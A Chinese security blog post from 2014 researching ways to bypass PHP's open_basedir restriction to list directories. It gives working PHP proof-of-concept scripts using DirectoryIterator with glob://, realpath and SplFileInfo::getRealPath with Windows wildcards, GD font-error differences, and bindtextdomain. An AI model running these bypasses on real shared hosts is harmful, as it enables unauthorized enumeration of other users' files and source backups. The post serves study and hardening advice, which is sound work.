

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>PHP绕过open_basedir列目录的研究 | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                PHP &raquo; <a href="php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">PHP绕过open_basedir列目录的研究</h1>
            <div class="details-up">
  <span class="author">作者: None</span>
  
  <span class="category">分类: <a href="../sort/PHP.html">PHP</a></span>
  
  <span class="date">时间: 2014-11-21 17:28</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">5条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="php-bypass-open-basedir-list-directory.html">19827人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/open_basedir.html">open_basedir</a>
    
        <a href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
    
  </span>
  
</div>
            <div class="entry">
                <p>首发drops：<a href="http://drops.wooyun.org/tips/3978"><a href="http://drops.wooyun.org/tips/3978">http://drops.wooyun.org/tips/3978</a></a> 。</p>
<p>近期由于在开发自己的webshell，所以对PHP一些已有的漏洞进行了一定的研究，并且也自己发现了部分PHP存在的安全隐患。这篇文章我来与大家分享一下自己对于PHP中open_basedir绕过并列举目录的方法总结。</p>
<h2 id="0x01-open_basedir"><a class="toclink" href="#0x01-open_basedir">0x01 open_basedir的简介</a></h2>
<p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。</p>
<p>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。</p>
<p>在现在这个各种云、虚拟主机横行的时期，人们希望open_basedir作为一个横亘在不同用户之间的屏障，有力地保障用户的主机能独立运行，但事实并非人们想象的那么简单。</p>
<p>我们这篇文章着重讲的将是绕过open_basedir进行目录的列举与遍历，为何我们不说具体文件的读、写，因为文件读写的洞是危害比较大的漏洞了，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p>
<h2 id="0x02-directoryiterator-glob"><a class="toclink" href="#0x02-directoryiterator-glob">0x02 利用DirectoryIterator + Glob 直接列举目录</a></h2>
<p>这是@/fd 脚本（<a href="http://zone.wooyun.org/content/11268"><a href="http://zone.wooyun.org/content/11268">http://zone.wooyun.org/content/11268</a></a>）里给出的第一个方法。</p>
<p>DirectoryIterator 是php5中增加的一个类，为用户提供一个简单的查看目录的接口（The DirectoryIterator class provides a simple interface for viewing the contents of filesystem directories）。</p>
<p>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径。</p>
<p>结合这两个方式，我们就可以在php5.3以后对目录进行列举。在实测中，我们得知，此方法在Linux下列举目录居然可以无视open_basedir。</p>
<p>实例代码：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">printf</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#39;</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
<span class="nv">$file_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="c1">// normal files</span>
<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&quot;glob:///*&quot;</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$file_list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
<span class="p">}</span>
<span class="c1">// special files (starting with a dot(.))</span>
<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&quot;glob:///.*&quot;</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$file_list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
<span class="p">}</span>
<span class="nb">sort</span><span class="p">(</span><span class="nv">$file_list</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$file_list</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">{</span><span class="nv">$f</span><span class="si">}</span><span class="s2">&lt;br/&gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>执行我们可以发现，open_basedir为/usr/share/nginx/www/:/tmp/，但我们成功列举了/根目录下的所有文件：</p>
<p><a href="../content/uploadfile/201411/1b031416562447.png"><img alt="PHP绕过open_basedir列目录的研究1497.png" src="../content/uploadfile/201411/1b031416562447.png" /></a></p>
<p>这个方法也是迄今为止最方便的方法，他不用暴力猜解目录，而是直接列举。但他对php版本、系统版本有一定要求，在5.3以上可列举（5.5/5.6可能会有修复？在官方没看到有fix），需要在Linux下才能绕过open_basedir。</p>
<h2 id="0x03-realpath"><a class="toclink" href="#0x03-realpath">0x03 realpath列举目录</a></h2>
<p>这是@/fd 脚本（<a href="http://zone.wooyun.org/content/11268"><a href="http://zone.wooyun.org/content/11268">http://zone.wooyun.org/content/11268</a></a>）里给出的第二个方法。</p>
<p>Realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p>
<p>在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。</p>
<p>所以我们可以通过这个特点，来进行目录的猜解。举个例子，我们需要猜解根目录（不在open_basedir中）下的所有文件，只用写一个捕捉php错误的函数err_handle()。当猜解某个存在的文件时，会因抛出错误而进入err_handle()，当猜解某个不存在的文件时，将不会进入err_handle()。</p>
<p>那么由此我们来算算效率。假如一个文件名长度为6位（如config、passwd等全小写不带数字）的文件，我们最差需要枚举多少次才能猜测到他是否存在：</p>
<p><code>26 ** 6 = 308915776次</code></p>
<p><a href="../content/uploadfile/201411/bc9b1416562449.png"><img alt="PHP绕过open_basedir列目录的研究2150.png" src="../content/uploadfile/201411/bc9b1416562449.png" /></a></p>
<p>这样是需要跑很久的，基本每次跑的时候我都没耐心了，这样暴力猜解肯定是不行的。那么，有什么好办法可以变这个“鸡肋”的漏洞为一个“好用”的漏洞？</p>
<p>熟悉Windows + PHP的同学应该还记得Windows下有两个特殊的通配符：&lt;、&gt;</p>
<p>对，我们这里就借用这些通配符的力量来列举目录。写个简单的POC来列举一下：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
<span class="nb">set_error_handler</span><span class="p">(</span><span class="s1">&#39;isexists&#39;</span><span class="p">);</span>
<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;d:/test/&#39;</span><span class="p">;</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&lt;&#39;</span><span class="p">;</span>
    <span class="nb">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">&#39;/File\((.*)\) is not within/&#39;</span><span class="p">;</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">printf</span><span class="p">(</span><span class="s2">&quot;%s &lt;br/&gt;&quot;</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>首先设置open_basedir为当前目录，并枚举d:/test/目录下的所有文件。将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来。</p>
<p>执行可以看到：</p>
<p><a href="../content/uploadfile/201411/51cf1416562451.png"><img alt="PHP绕过open_basedir列目录的研究2934.png" src="../content/uploadfile/201411/51cf1416562451.png" /></a></p>
<p>Open_basedir为c:\wamp\www，但我们列举出了d:/test/目录下的文件。</p>
<p>当然，这是个很粗糙的POC，因为我并没有考虑到首字母相同的文件，所以这个POC只能列举首字母不同的文件。</p>
<p>如果首字母相同，我们只需要再枚举第二个字符、第三个字符依次类推，即可列举出目录中所有文件。</p>
<p>这个方法好处是windows下php所有版本通用，当然坏处就是只有windows下才能使用通配符，如果是linux下就只能暴力猜解了。</p>
<h2 id="0x04-splfileinfogetrealpath"><a class="toclink" href="#0x04-splfileinfogetrealpath">0x04 SplFileInfo::getRealPath列举目录</a></h2>
<p>受到上一个方法的启发，我开始在php中寻找类似的方法。一旦realpath不能使用的情况下，也能找到替代方式。</p>
<p>我找到了新方法：<a href="http://www.wooyun.org/bugs/wooyun-2010-083453"><a href="http://www.wooyun.org/bugs/wooyun-2010-083453">http://www.wooyun.org/bugs/wooyun-2010-083453</a></a> ，使用的方式是SplFileInfo::getRealPath。</p>
<p>SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath。</p>
<p>这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。</p>
<p>这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。</p>
<p>我们的realpath函数还是考虑了open_basedir，只是在报错上没有考虑周全导致我们能够判断某个文件是否存在。但我们可爱的SplFileInfo::getRealPath方法是直接没有考虑open_basedir，就能够判断一个文件是否存在。</p>
<p>那么，我给出一个POC：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
<span class="nv">$basedir</span> <span class="o">=</span> <span class="s1">&#39;D:/test/&#39;</span><span class="p">;</span>
<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
    <span class="nv">$info</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileInfo</span><span class="p">(</span><span class="nv">$basedir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&lt;&#39;</span><span class="p">);</span>
    <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="na">getRealPath</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
    <span class="k">echo</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">;</span>
    <span class="nb">ob_flush</span><span class="p">();</span>
    <span class="nb">flush</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>只是把之前的POC稍作修改，同样列出了D:/test下的文件：</p>
<p><a href="../content/uploadfile/201411/3b001416562455.png"><img alt="PHP绕过open_basedir列目录的研究4269.png" src="../content/uploadfile/201411/3b001416562455.png" /></a></p>
<p>这个方法有个特点，不管是否开启open_basedir都是可以枚举任意目录的。而上一个方法（realpath）只有在开启open_basedir且在open_basedir外的时候才会报错，才能列举目录。当然，没有开启open_basedir的时候也不需要这样列举目录了。</p>
<h2 id="0x05-gdimageftbboximagefttext"><a class="toclink" href="#0x05-gdimageftbboximagefttext">0x05 GD库imageftbbox/imagefttext列举目录</a></h2>
<p>GD库一般是PHP必备的扩展库之一，所以我在寻找open_basedir的时候也会看看这些有用的扩展库。</p>
<p>这是新方法：<a href="http://www.wooyun.org/bugs/wooyun-2010-083688"><a href="http://www.wooyun.org/bugs/wooyun-2010-083688">http://www.wooyun.org/bugs/wooyun-2010-083688</a> </a></p>
<p>我拿imageftbbox举个例子，这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。</p>
<p>也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。</p>
<p>我也修改了个简单的POC：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
<span class="nb">set_error_handler</span><span class="p">(</span><span class="s1">&#39;isexists&#39;</span><span class="p">);</span>
<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;d:/test/&#39;</span><span class="p">;</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&lt;&#39;</span><span class="p">;</span>
    <span class="c1">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span>
    <span class="c1">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);</span>
    <span class="nb">imageftbbox</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;aaa&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">global</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$errstr</span><span class="p">,</span> <span class="s1">&#39;Invalid font filename&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">printf</span><span class="p">(</span><span class="s2">&quot;%s&lt;br/&gt;&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>同样列举一下d:/test</p>
<p><a href="../content/uploadfile/201411/092c1416562456.png"><img alt="PHP绕过open_basedir列目录的研究5469.png" src="../content/uploadfile/201411/092c1416562456.png" /></a></p>
<p>如上图，我们发现虽然“通配符”在判断是否存在的时候奏效了，但我们真正的文件名并没有显示出来，而是还是以通配符“&lt;&gt;&lt;”代替。</p>
<p>所以，这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处。所以，我们只能一位一位地猜测，但总体来说，还是能够猜测出来的，只不过可能比realpath更麻烦一些罢了。</p>
<h2 id="0x06-bindtextdomain"><a class="toclink" href="#0x06-bindtextdomain">0x06 bindtextdomain暴力猜解目录</a></h2>
<p>这是新方法：<a href="http://www.wooyun.org/bugs/wooyun-2010-083457"><a href="http://www.wooyun.org/bugs/wooyun-2010-083457">http://www.wooyun.org/bugs/wooyun-2010-083457</a> </a></p>
<p>bindtextdomain是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：<a href="http://php.net/manual/en/function.gettext.php">http://php.net/manual/en/function.gettext.php</a>）</p>
<p>Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而我的windows环境下是没有bindtextdomain函数的，我的linux环境是默认存在这个函数。</p>
<p><a href="../content/uploadfile/201411/9ee71416562458.png"><img alt="PHP绕过open_basedir列目录的研究6098.png" src="../content/uploadfile/201411/9ee71416562458.png" /></a></p>
<p>如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。</p>
<p>写个简单的测试代码：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">printf</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#39;</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
<span class="nv">$re</span> <span class="o">=</span> <span class="nb">bindtextdomain</span><span class="p">(</span><span class="s1">&#39;xxx&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>当/etc/passwd存在的时候输出之：</p>
<p><a href="../content/uploadfile/201411/b05b1416562461.png"><img alt="PHP绕过open_basedir列目录的研究6343.png" src="../content/uploadfile/201411/b05b1416562461.png" /></a></p>
<p>当/etc/wooyun不存在的时候返回false：</p>
<p><a href="../content/uploadfile/201411/5ae51416562463.png"><img alt="PHP绕过open_basedir列目录的研究6373.png" src="../content/uploadfile/201411/5ae51416562463.png" /></a></p>
<p>并没有考虑到open_basedir。所以，我们也可以通过返回值的不同来猜解、列举某个目录。</p>
<p>但很大的鸡肋点在，windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，所以显得很鸡肋。</p>
<p>当然，在万无退路的时候进行暴力猜解目录，也不失为一个还算行的方法。</p>
<h2 id="0x07"><a class="toclink" href="#0x07">0x07 总结</a></h2>
<p>open_basedir本来作为php限制跨目录读写文件的最基础的方式，应该需要进行完好的设计。但可能php在当初编写代码的时候并没有进行一个统一的设计，导致每当新增加功能或遇到一些偏僻的函数的时候，都会出现类似“open_basedir绕过”等悲剧。</p>
<p>我曾经写过一篇文章，《lnmp虚拟主机安全配置研究》，中讲述了一个防止虚拟主机跨目录的方法。但受到了一些白帽子的质疑：</p>
<p><a href="../content/uploadfile/201411/6a2c1416562464.png"><img alt="PHP绕过open_basedir列目录的研究6713.png" src="../content/uploadfile/201411/6a2c1416562464.png" /></a></p>
<p>原因是很多人过于相信open_basedir的可靠性。open_basedir固然是一个简单地限制跨目录的方法，但如果过于依赖某一个方法去防御一类攻击，你将会死的很惨。</p>
<p><a href="../content/uploadfile/201411/c6551416562465.png"><img alt="PHP绕过open_basedir列目录的研究6800.png" src="../content/uploadfile/201411/c6551416562465.png" /></a></p>
<p>open_basedir绕过方法固然有版本局限，但不排除有很多人手中握着0day。像我这样对php造诣并不算高的菜鸟也能找到的open_basedir绕过漏洞，你真的能保证大牛们都没有办法绕过么？</p>
<p>我当然更能相信linux/windows等操作系统自带的权限控制机制，也不会单单相信open_basedir真的能帮我防御什么。</p>
<p>By the way，我上面提到的这些方法，基本都还没有在php的最新版修复（甚至是我自己发现的“0day”），也就是说还真的有这么多通用的方法可以绕过open_basedir。</p>
<p>估计又会有人质疑了，光绕过open_basedir列目录有什么用？</p>
<p>诚然，列目录相比于读、写具体文件，都鸡肋了很多。但很多时候，就是这些看似“鸡肋”的漏洞组合技完成了绝杀。</p>
<p>当列目录可以列出备份文件、整站源码的时候，你还能说列目录是个鸡肋的漏洞么？</p>
<p>安全是一个水桶，不是看哪块木板最高，而是看哪块木板最低。当我们保护住这些“低木板”的时候，才能真正守护住水桶。</p>
<p>而对于渗透测试的同学来说，open_basedir绕过也希望给大家一个新的思路：拿旁站不一定非要提权或弹shell，有时候可能只是简单地列一下目录，就能给你所有。</p>
<h2 id="0x08"><a class="toclink" href="#0x08">0x08 参考文档与链接</a></h2>
<p><a href="http://zone.wooyun.org/content/11268">http://zone.wooyun.org/content/11268</a><br />
<a href="http://www.wooyun.org/bugs/wooyun-2010-083453">http://www.wooyun.org/bugs/wooyun-2010-083453</a><br />
<a href="http://www.wooyun.org/bugs/wooyun-2010-083688">http://www.wooyun.org/bugs/wooyun-2010-083688</a><br />
<a href="http://www.wooyun.org/bugs/wooyun-2010-083457">http://www.wooyun.org/bugs/wooyun-2010-083457</a><br />
<a href="http://php.net/manual/en/class.directoryiterator.php">http://php.net/manual/en/class.directoryiterator.php</a><br />
<a href="http://php.net/manual/zh/wrappers.glob.php">http://php.net/manual/zh/wrappers.glob.php</a><br />
<a href="http://php.net/manual/en/function.realpath.php">http://php.net/manual/en/function.realpath.php</a><br />
<a href="http://php.net/manual/en/splfileinfo.getrealpath.php">http://php.net/manual/en/splfileinfo.getrealpath.php</a><br />
<a href="http://php.net/manual/en/book.image.php">http://php.net/manual/en/book.image.php</a><br />
<a href="http://php.net/manual/en/function.gettext.php">http://php.net/manual/en/function.gettext.php</a></p>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/open_basedir.html">open_basedir</a>
                
                    <a href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 5 条评论</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-1904">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/4b1401a66f7058d02b706e8cb74c135b.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.baidu.com" target="_blank" rel="nofollow noopener">呵呵</a></div>
                    <p>大牛，请教一下，windows下的&lt;&gt;两个通配符的说法... 小菜不懂 ：(</p>
                    <span class="comment-time">时间: 2014-12-29 11:41</span>
                    <span class="comment-reply"><a href="#comment-1904" onclick="reply_to('1904','呵呵')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1905">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
